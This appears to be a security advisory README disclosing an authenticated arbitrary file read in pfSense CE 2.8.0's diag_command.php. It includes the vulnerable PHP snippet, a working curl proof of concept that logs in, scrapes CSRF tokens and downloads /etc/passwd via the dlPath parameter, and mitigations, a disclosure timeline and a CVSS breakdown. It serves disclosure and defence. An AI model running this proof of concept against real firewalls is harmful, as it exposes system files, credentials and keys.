@@ -1,1 +1,161 @@
-# pfsense-security-research
+# Arbitrary File Read in pfSense 2.8.0 via Diagnostics Interface
+
+#### CVE ID: *Pending*
+
+#### Date: 2025-06-27
+
+#### Author: Seth Kraft
+
+#### Vendor Homepage: [https://www.netgate.com/](https://www.netgate.com/)
+
+#### Vendor Changelog: [https://docs.netgate.com/pfsense/en/latest/releases/](https://docs.netgate.com/pfsense/en/latest/releases/)
+
+#### Software Link: [https://www.pfsense.org/download/](https://www.pfsense.org/download/)
+
+#### Version: pfSense CE 2.8.0 (latest stable as of June 26, 2025)
+
+#### CWE: CWE-552 (Files or Directories Accessible to External Parties)
+
+#### CVSS Base Score: 6.5 (Medium)
+
+#### Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
+
+#### Type: Authenticated Arbitrary File Read / Local File Disclosure
+
+---
+
+## Authorization
+
+**For authorized testing and research purposes only.** Do not test or exploit this vulnerability on systems you do not own or have explicit permission to test.
+
+---
+
+## Summary
+
+pfSense CE 2.8.0 contains a Local File Disclosure vulnerability in the diagnostics page `diag_command.php`, which allows authenticated users to download arbitrary files from the underlying file system.
+
+An attacker with privileged GUI access to **Diagnostics > Command Prompt** can supply an arbitrary path in the `dlPath` parameter to exfiltrate sensitive files. 
+
+This functionality lacks any path sanitization, directory restriction, or access controls beyond GUI permission assignment.
+
+This behavior occurs even when the user only has the `WebCfg - Diagnostics: Command` permission assigned.
+
+---
+
+## Details
+
+The vulnerable logic is located in the file `src/usr/local/www/diag_command.php`:
+
+```php
+if ($_POST['submit'] == "DOWNLOAD" && file_exists($_POST['dlPath'])) {
+    session_cache_limiter('public');
+    send_user_download('file', $_POST['dlPath']);
+}
+```
+
+There are no security checks or sanitization measures applied to the user-controlled `dlPath` parameter. 
+
+Any file path the PHP process can read will be served back to the user.
+
+This enables exfiltration of:
+
+* `/etc/passwd`
+* SSH private keys
+* VPN credentials
+* System-wide configuration
+
+---
+
+## Proof of Concept
+
+This proof-of-concept authenticates using a user account `dev` that is only assigned the `WebCfg - Diagnostics: Command` permission.
+
+```bash
+# 1. Start session and extract CSRF token
+curl -k -c cookies.txt -s https://<IP>/diag_command.php > login_page.html
+csrf_token=$(grep '__csrf_magic' login_page.html | grep 'value=' | sed -E 's/.*value="([^"]+)".*/\1/')
+
+# 2. Authenticate as low-privileged user "dev"
+curl -k -b cookies.txt -c cookies.txt \
+  -d "__csrf_magic=$csrf_token" \
+  -d "usernamefld=dev" \
+  -d "passwordfld=pfsense" \
+  -d "login=Sign+In" \
+  https://<IP>/index.php > /dev/null
+
+# 3. Get CSRF token post-login
+curl -k -b cookies.txt -s https://<IP>/diag_command.php > diag_authed.html
+csrf_token=$(grep '__csrf_magic' diag_authed.html | grep 'value=' | sed -E 's/.*value="([^"]+)".*/\1/')
+
+# 4. Exfiltrate arbitrary file (example: /etc/passwd)
+curl -k -b cookies.txt -s -X POST https://<IP>/diag_command.php \
+  -d "__csrf_magic=$csrf_token" \
+  -d "submit=DOWNLOAD" \
+  -d "dlPath=/etc/passwd"
+```
+
+**Group configuration and assigned privileges:**
+![Screenshot 2025-06-27 133201](https://github.com/user-attachments/assets/b1063a5c-442a-4628-ac94-e0fa5d6f10c4)
+
+> I acknowledge and appreciate the built-in warning in the pfSense UI. However, this disclaimer does not constitute proper access control.
+>
+> The existence of a warning does not justify a design that equates a single web permission with unrestricted system-level file access.
+
+**Screenshot of `dev` user:**
+![Screenshot 2025-06-27 133218](https://github.com/user-attachments/assets/7224934e-ae31-4aa1-b879-b4f1aee7e00c)
+
+---
+
+## Demo
+![pfSense-authenticated-file-disclosure-poc](https://github.com/user-attachments/assets/0dfe9727-aab4-4b17-bcb9-5a69998549a5)
+
+---
+
+## Impact
+
+Any pfSense user assigned the `Diagnostics: Command` privilege can:
+
+* Read sensitive local system files
+* Extract backups, credentials, and keys
+* Access files far beyond their intended GUI role
+
+This violates the principle of least privilege and breaks logical privilege boundaries.
+
+---
+
+## Suggested Mitigation
+
+1. Restrict `dlPath` to a safe base directory (e.g., `/tmp`) using `realpath()` and prefix enforcement
+2. Strip or block paths with `..` or absolute paths
+3. Only allow downloads of files listed in a whitelist or temporary artifact directory
+
+---
+
+## Disclosure Timeline
+
+* **2025-06-26:** Vulnerability reported to Netgate
+* **2025-06-27:** Netgate responded, dismissing the issue as intended behavior
+* **2025-06-27:** Researcher rebuttal, but was dismissed again - initiated public disclosure due to vendor inaction
+
+![image](https://github.com/user-attachments/assets/8317dd1d-95c7-4000-a942-f9435d40cfa8)
+
+> While the vendor asserts that access to this page equates to root, this conflates GUI-level permissions with unrestricted backend access.
+>
+> Privilege should be technically enforced — not assumed — and warnings in the UI are no substitute for secure design.
+
+---
+
+## Estimated CVSS Breakdown
+
+| Metric                      | Value         | Justification                                          |
+| --------------------------- | ------------- | ------------------------------------------------------ |
+| **AV: Attack Vector**       | N (Network)   | Exploitable via the pfSense web interface over HTTPS   |
+| **AC: Attack Complexity**   | L (Low)       | Straightforward POST request with valid CSRF token     |
+| **PR: Privileges Required** | L (Low)       | Requires only Diagnostics: Command GUI permission      |
+| **UI: User Interaction**    | N (None)      | No additional interaction needed                       |
+| **S: Scope**                | U (Unchanged) | Same component boundary (web app reads system file)    |
+| **C: Confidentiality**      | H (High)      | Arbitrary file read, including credentials and configs |
+| **I: Integrity**            | N (None)      | No tampering                                           |
+| **A: Availability**         | N (None)      | No denial-of-service                                   |
+
+**Base Score: 6.5 (Medium)**
